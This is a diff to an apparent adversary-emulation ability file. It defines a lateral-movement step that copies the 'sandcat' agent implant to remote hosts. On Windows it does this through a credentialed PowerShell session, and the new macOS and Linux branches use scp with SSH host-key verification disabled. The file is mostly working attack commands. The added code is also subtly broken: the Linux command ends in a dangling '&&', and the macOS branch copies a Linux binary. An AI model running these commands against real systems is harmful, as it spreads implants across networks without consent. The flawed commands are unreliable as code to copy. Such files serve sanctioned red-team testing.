@@ -1,8 +1,8 @@
 ---
 
 - id: 4908fdc4-74fc-4d7c-8935-26d11ad26a8d
-  name: Move 54ndc47
-  description: Copy 54ndc47 to remote host and start it
+  name: Copy 54ndc47
+  description: Copy 54ndc47 to remote host
   tactic: lateral-movement
   technique:
     attack_id: T1105
@@ -19,3 +19,15 @@
         $session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;
         Invoke-Command -Session $session -ArgumentList $file -ScriptBlock{[System.IO.File]::WriteAllBytes("C:\sandcat.exe", $args)};
       payload: sandcat.exe
+    darwin:
+      command: |
+        scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{files}/sandcat-linux #{remote.ssh.cmd}:~
+      cleanup: |
+        ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm sandcat-linux'
+      payload: sandcat-linux
+    linux:
+      command: |
+        scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{files}/sandcat-linux #{remote.ssh.cmd}:~ &&
+      cleanup: |
+        ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm sandcat-linux'
+      payload: sandcat-linux
